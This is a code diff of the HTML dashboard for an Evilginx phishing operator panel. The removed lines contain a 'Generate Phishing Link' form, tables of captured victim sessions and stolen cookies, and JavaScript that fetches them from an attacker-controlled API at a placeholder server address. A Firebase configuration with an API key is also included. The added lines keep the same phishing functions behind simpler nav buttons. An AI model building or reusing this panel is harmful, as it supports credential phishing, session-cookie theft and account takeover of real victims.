@@ -3,165 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard | Evilginx Panel</title>
+    <title>Dashboard - Evilginx</title>
     <link rel="stylesheet" href="styles.css">
-    <script defer src="script.js"></script>
-    
-    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js"></script>
 </head>
-<body>
+<body class="animated-background">
     <div class="dashboard-container">
-        <!-- Sidebar Menu -->
-        <aside class="sidebar">
+        <nav>
+            <button onclick="generateLink()">Generate Link</button>
+            <button onclick="loadCapturedSessions()">Captured Sessions</button>
+            <button onclick="loadCookies()">Cookies</button>
+            <button onclick="logout()">Logout</button>
+        </nav>
+
+        <div id="content">
             <h2>Dashboard</h2>
-            <ul>
-                <li onclick="showSection('generate-link')">🔗 Generate Link</li>
-                <li onclick="showSection('captured-sessions')">📊 Captured Sessions</li>
-                <li onclick="showSection('cookies')">🍪 View Cookies</li>
-                <li onclick="showSection('drakotech')">⚙️ Drakotech</li>
-                <li onclick="logout()">🚪 Logout</li>
-            </ul>
-        </aside>
-
-        <!-- Main Content -->
-        <main class="main-content">
-            <!-- Generate Link Section -->
-            <section id="generate-link" class="content-section">
-                <h2>Generate Phishing Link</h2>
-                <input type="text" id="lureId" placeholder="Enter Lure ID">
-                <button onclick="generatePhishingLink()">Generate</button>
-                <p id="generatedLink"></p>
-            </section>
-
-            <!-- Captured Sessions Section -->
-            <section id="captured-sessions" class="content-section" style="display:none;">
-                <h2>Captured Sessions</h2>
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Session ID</th>
-                            <th>IP Address</th>
-                            <th>Location</th>
-                            <th>Timestamp</th>
-                        </tr>
-                    </thead>
-                    <tbody id="sessionsTable"></tbody>
-                </table>
-            </section>
-
-            <!-- Cookies Section -->
-            <section id="cookies" class="content-section" style="display:none;">
-                <h2>Captured Cookies</h2>
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Session ID</th>
-                            <th>Cookie Name</th>
-                            <th>Value</th>
-                        </tr>
-                    </thead>
-                    <tbody id="cookiesTable"></tbody>
-                </table>
-            </section>
-
-            <!-- Drakotech Section -->
-            <section id="drakotech" class="content-section" style="display:none;">
-                <h2>Drakotech Panel</h2>
-                <p>Feature coming soon...</p>
-            </section>
-        </main>
+            <p>Select an option from the menu.</p>
+        </div>
     </div>
 
-    <script>
-        // Firebase Configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
-            authDomain: "panel-auth-134b7.firebaseapp.com",
-            projectId: "panel-auth-134b7",
-            storageBucket: "panel-auth-134b7.firebasestorage.app",
-            messagingSenderId: "892746068340",
-            appId: "1:892746068340:web:f8c4d5b798e8bc48447c21"
-        };
-
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const auth = firebase.auth();
-
-        // Redirect to login if not authenticated
-        auth.onAuthStateChanged(user => {
-            if (!user) {
-                window.location.href = "index.html";
-            }
-        });
-
-        // Logout function
-        function logout() {
-            auth.signOut().then(() => {
-                window.location.href = "index.html";
-            }).catch(error => console.error("Logout error:", error));
-        }
-
-        // Evilginx API Base URL
-        const API_BASE_URL = "http://YOUR_SERVER_IP:5000"; 
-
-        function showSection(sectionId) {
-            document.querySelectorAll(".content-section").forEach(section => {
-                section.style.display = "none";
-            });
-            document.getElementById(sectionId).style.display = "block";
-        }
-
-        async function generatePhishingLink() {
-            let lureId = document.getElementById("lureId").value;
-            if (!lureId) return alert("Please enter a Lure ID.");
-            
-            let response = await fetch(`${API_BASE_URL}/generate_link`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ lure_id: lureId })
-            });
-            let data = await response.json();
-            if (data.link) {
-                document.getElementById("generatedLink").innerHTML = `<a href="${data.link}" target="_blank">${data.link}</a>`;
-            } else {
-                alert("Error generating link.");
-            }
-        }
-
-        async function fetchCapturedSessions() {
-            let response = await fetch(`${API_BASE_URL}/captured_sessions`);
-            let data = await response.json();
-            let tableBody = document.getElementById("sessionsTable");
-            tableBody.innerHTML = ""; 
-
-            data.sessions.forEach(session => {
-                let row = `<tr>
-                    <td>${session.id}</td>
-                    <td>${session.ip}</td>
-                    <td>${session.location || "N/A"}</td>
-                    <td>${session.timestamp}</td>
-                </tr>`;
-                tableBody.innerHTML += row;
-            });
-        }
-
-        async function fetchCookies() {
-            let response = await fetch(`${API_BASE_URL}/get_cookies`);
-            let data = await response.json();
-            let tableBody = document.getElementById("cookiesTable");
-            tableBody.innerHTML = ""; 
-
-            data.cookies.forEach(cookie => {
-                let row = `<tr>
-                    <td>${cookie.session_id}</td>
-                    <td>${cookie.name}</td>
-                    <td>${cookie.value}</td>
-                </tr>`;
-                tableBody.innerHTML += row;
-            });
-        }
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
